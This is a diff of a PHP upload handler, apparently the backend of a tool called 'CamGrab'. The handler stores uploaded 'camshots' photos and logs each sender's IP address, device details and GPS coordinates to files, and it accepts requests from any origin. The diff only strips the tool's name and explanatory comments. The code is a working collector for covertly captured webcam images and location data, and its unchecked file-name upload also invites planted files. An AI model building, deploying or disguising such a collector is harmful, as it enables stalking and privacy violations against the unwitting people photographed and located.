@@ -1,10 +1,9 @@
 <?php
-// Upload handler for CamGrab
+// upload handler
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST');
 header('Access-Control-Allow-Headers: Content-Type');
 
-// Create directories if they don't exist
 $camshots_dir = 'camshots';
 $logs_dir = 'logs';
 
@@ -22,7 +21,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $log_entry .= "Time: $timestamp\n";
     $log_entry .= "IP: $ip\n";
     
-    // Handle photo upload
+    // save photo
     if (isset($_FILES['photo'])) {
         $photo = $_FILES['photo'];
         $filename = time() . '_' . basename($photo['name']);
@@ -33,7 +32,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
     }
     
-    // Handle device info
+    // log device info
     if (isset($_POST['device_info'])) {
         $device_info = json_decode($_POST['device_info'], true);
         $log_entry .= "Device Info:\n";
@@ -41,11 +40,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $log_entry .= "  $key: $value\n";
         }
         
-        // Save detailed device info
         file_put_contents($logs_dir . '/device_' . time() . '.json', $_POST['device_info']);
     }
     
-    // Handle location
+    // log gps
     if (isset($_POST['location'])) {
         $location = json_decode($_POST['location'], true);
         $log_entry .= "Location:\n";
@@ -53,7 +51,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $log_entry .= "  $key: $value\n";
         }
         
-        // Save location data
         file_put_contents($logs_dir . '/location_' . time() . '.json', $_POST['location']);
     }
     
